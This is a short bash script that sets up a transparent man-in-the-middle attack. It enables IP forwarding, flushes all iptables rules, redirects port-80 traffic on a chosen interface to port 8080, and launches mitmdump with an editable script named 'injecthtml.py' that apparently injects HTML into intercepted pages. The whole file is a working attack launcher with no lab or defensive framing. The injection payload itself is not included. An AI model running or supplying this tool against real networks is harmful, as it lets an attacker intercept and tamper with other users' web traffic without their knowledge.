#!/bin/bash

BROWN='\033[0;33m'
DGREY='\033[1;30m'
LPURPLE='\033[1;35m'
BLUE='\033[0;34m'
RED='\033[0;31m'
NC='\033[0m'

conf_parameters(){
    echo '1' > /proc/sys/net/ipv4/ip_forward
    iptables -F
    iptables -F -t nat
    iptables -t nat -A PREROUTING -i $1 -p tcp --dport 80 -j REDIRECT --to-port 8080
}

stop(){
    pkill mitmdump
    iptables -F
    iptables -F -t nat
    #echo '0' > /proc/sys/net/ipv4/ip_forward
}

if [[ $EUID -ne 0 ]]
then
    echo -e "${RED}RUN AS SUDO"
    exit
fi

printf "${BLUE}Enter your network interface\n"
listinterfaces=$(ifconfig | grep flags | awk -F ":" '{print $1}' | grep -v "lo")

for each in "${listinterfaces[@]}"
do
  echo -e "\t${BROWN}1) $each"
done

printf "${DGREY}#> "
printf "${NC}"
read interface
ip=$(ifconfig | grep $interface -A 1 | grep inet | awk '{print $2}')

script='injecthtml.py'
nano $script

conf_parameters $interface

mitmdump -s $script --mode transparent --listen-host $ip

stop
